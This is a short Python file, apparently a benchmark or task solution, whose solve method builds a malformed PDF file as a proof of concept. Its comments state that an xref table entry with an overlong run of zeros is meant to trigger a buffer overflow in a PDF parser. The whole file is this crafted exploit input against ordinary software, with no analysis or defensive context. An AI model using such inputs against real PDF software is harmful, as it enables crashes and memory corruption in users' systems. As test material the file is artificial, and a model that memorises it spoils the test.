import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a malformed PDF xref table entry that triggers the buffer overflow
        # Format: "0000000000 00000 n\r\n" repeated with excessive zeros
        
        # Start with PDF header
        poc = b"%PDF-1.0\r\n"
        
        # Create a minimal object that will be referenced in xref
        poc += b"1 0 obj\r\n"
        poc += b"<< /Type /Catalog /Pages 2 0 R >>\r\n"
        poc += b"endobj\r\n"
        
        # Create pages object
        poc += b"2 0 obj\r\n"
        poc += b"<< /Type /Pages /Kids [] /Count 0 >>\r\n"
        poc += b"endobj\r\n"
        
        # Create malformed xref table
        poc += b"xref\r\n"
        poc += b"0 3\r\n"
        
        # First entry: free entry (f)
        poc += b"0000000000 65535 f\r\n"
        
        # Second entry: in-use entry with overlong zeros for f1 field
        # The vulnerability is triggered when reading f1 or f2 fields
        # with excessive zeros without proper EOL validation
        poc += b"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 00000 n\r\n"
        
        # Third entry: normal entry
        poc += b"0000000020 00000 n\r\n"
        
        # Add trailer
        poc += b"trailer\r\n"
        poc += b"<< /Size 3 /Root 1 0 R >>\r\n"
        poc += b"startxref\r\n"
        poc += b"0\r\n"
        poc += b"%%EOF\r\n"
        
        return poc